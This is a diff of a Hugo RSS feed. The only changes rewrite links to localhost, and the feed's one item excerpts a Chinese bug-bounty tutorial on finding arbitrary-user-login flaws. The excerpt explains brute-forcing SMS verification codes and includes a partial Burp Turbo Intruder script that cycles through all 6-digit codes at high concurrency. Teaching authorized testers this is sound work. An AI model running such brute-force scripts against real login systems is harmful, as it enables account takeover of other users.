@@ -2,17 +2,17 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>用户登录 on </title>
-    <link>/tags/%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/</link>
+    <link>//localhost:1313/tags/%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/</link>
     <description>Recent content in 用户登录 on </description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
     <lastBuildDate>Sat, 20 Jan 2024 18:17:14 +0800</lastBuildDate>
-    <atom:link href="/tags/%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/index.xml" rel="self" type="application/rss+xml" />
+    <atom:link href="//localhost:1313/tags/%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>任意用户登录漏洞挖掘思路</title>
-      <link>/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/</link>
+      <link>//localhost:1313/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/</link>
       <pubDate>Sat, 20 Jan 2024 18:17:14 +0800</pubDate>
-      <guid>/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/</guid>
+      <guid>//localhost:1313/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/</guid>
       <description>转载自： https://forum.butian.net/share/2553&#xA;任意用户登录漏洞挖掘思路 前言 任意用户登录漏洞以利用漏洞利用难度低、危害高、奖金高已经成为src/众测漏洞挖掘中的香饽饽，本文将分享一下众测/src中任意用户登录漏洞的挖掘思路。&#xA;1.手机验证码问题导致的任意用户登录 1.1 验证码爆破 当登录流程使用手机验证码登录，没有图片验证码/图片验证码可重用/图片验证码简单可识别（可以使用captcha-killer-modified插件）且后端没有限制手机验证码验证错误次数时，可以尝试爆破手机验证码登录其他用户。&#xA;4位验证码的爆破老生常谈不再赘述；随着厂商们服务器性能的提高，服务器的rps的上升也使得6位验证码的爆破越来越快，可以使用如下方法爆破（！！！需留意服务器的rps以及测试厂商的注意事项，rps低的老系统或者厂商禁止批量爆破的项目谨慎使用6位验证码的爆破！！！）：&#xA;使用burpsuite的Turbo Intruder插件，编写如下脚本：&#xA;1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import re def queueRequests(target, wordlists): engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=30, pipeline=True ) for i in range(1000000): #生成六位验证码字典 number = &amp;#34;{:06d}&amp;#34;.format(i) engine.queue(target.req, number.rstrip()) def handleResponse(req, interesting): # currently available attributes are req.status, req.wordcount, req.length and req.response if req.status &amp;lt;404: &amp;#39;&amp;#39;&amp;#39;res = re.</description>
     </item>
   </channel>
